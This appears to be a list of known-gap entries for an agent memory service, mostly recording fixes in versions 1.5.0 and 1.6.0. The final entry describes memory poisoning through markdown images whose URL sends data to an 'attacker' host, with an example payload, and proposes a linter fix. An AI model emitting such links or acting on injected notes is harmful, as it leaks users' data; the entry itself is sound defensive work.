GAP-SUPERSEDE.title: A new note does not retire the old one
GAP-SUPERSEDE.summary: Fixed in 1.6.0: replacing a note is a two-step action (preview, then confirm with a one-time code). The old note is kept, marked as replaced, hidden from search and lists, and can be brought back with undo.

GAP-RECENCY.title: A flagged-stale note can still rank above a fresher one
GAP-RECENCY.summary: Fixed in 1.6.0: when two notes about the same thing are close in meaning, the newer one now ranks first and the flagged-stale older twin is kept behind it.

GAP-HISTORY.title: No version history of note bodies
GAP-HISTORY.summary: Fixed in 1.6.0: every edit saves the earlier version (bounded, admin-only, encrypted at rest when encryption is on). An admin can list earlier versions and restore one; a restore is a new version.

GAP-REST-CAS.title: REST updates have no compare-and-swap
GAP-REST-CAS.summary: The MCP tool state_write accepts if_rev and refuses an edit made on an out-of-date copy. The REST PUT /notes/:id ignored it, so a stale REST edit silently replaced a newer one. Fixed in 1.5.0: PUT now takes if_rev and answers 409.

GAP-CONFIDENCE.title: No confidence field
GAP-CONFIDENCE.summary: Fixed in 1.6.0: a note can carry an optional confidence (0 to 1). It is the writer's claim, it is labelled as such, it survives edits, export and import, and it never overrides the trust rules.

GAP-POISON-MDLINK.title: Markdown image/link data-exfiltration payloads are not flagged
GAP-POISON-MDLINK.summary: The write-time linter looks for prompt-injection instructions and secrets, but not for markdown images or links whose URL smuggles data out (for example ![x](https://attacker/pixel?data=...)). A renderer or agent that auto-loads the image leaks the data. Such a note is stored as ordinary memory. Suggested fix: add a linter pattern (injection category) for markdown images/links whose URL host is off-allowlist and whose query or path carries note-derived data, and treat it like other injection findings (quarantine by default). The read-side untrusted-data banner already warns the agent, so this is defense-in-depth, not the only line.
